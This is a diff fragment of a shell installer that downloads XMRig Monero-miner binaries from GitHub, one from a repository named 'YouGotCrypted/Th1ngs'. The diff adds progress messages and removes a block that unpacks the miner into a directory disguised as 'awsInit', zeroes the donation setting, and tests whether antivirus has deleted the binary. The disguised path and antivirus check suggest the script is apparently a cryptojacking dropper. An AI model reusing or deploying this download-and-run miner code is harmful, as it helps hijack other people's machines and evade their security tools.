@@ -259,36 +259,18 @@ if [ "$libc_type" = "musl" ]; then
             fi
         fi
         if [ "$TYPE" = "raw6" ]; then
+            echo "Downloading RAW6 musl version"
             if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
                 echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
                 exit 1
             fi
         fi
     else
+        echo "Downloading RAW musl version"
         if ! curl -L --progress-bar "https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz" -o /tmp/data.tar.gz; then
             echo "ERROR: cant't download https://raw.githubusercontent.com/YouGotCrypted/Th1ngs/main/xmrig-musl-static-x64.tar.gz file to /tmp/data.tar.gz"
             exit 1
         fi
-    fi
-    echo "[*] Unpacking /tmp/data.tar.gz to $working_dir/awsInit"
-    [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
-    if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
-        echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
-        exit 1
-    fi
-    rm /tmp/data.tar.gz
-
-    echo "[*] Checking if advanced version of $working_dir/awsInit/xmrig works fine (and not removed by antivirus software)"
-    sed -i'' 's/"donate-level": *[^,]*,/"donate-level": 0,/' $working_dir/awsInit/config.json
-    $working_dir/awsInit/xmrig --help >/dev/null
-    if (test $? -ne 0); then
-        if [ -f $working_dir/awsInit/xmrig ]; then
-            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig is not functional"
-        else 
-            echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
-        fi
-        rm -rf $working_dir/awsInit
-        exit 1
     fi
 else
     if [ -n "$TYPE" ]; then
@@ -300,12 +282,14 @@ else
             fi
         fi
         if [ "$TYPE" = "raw6" ]; then
+            echo "Downloading RAW6 GLIBC version"
             if ! curl -L -6 --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
                 echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
                 exit 1
             fi
         fi
     else
+        echo "Downloading RAW GLIBC version"
         if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/data.tar.gz; then
             echo "ERROR: cant't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/data.tar.gz"
             exit 1
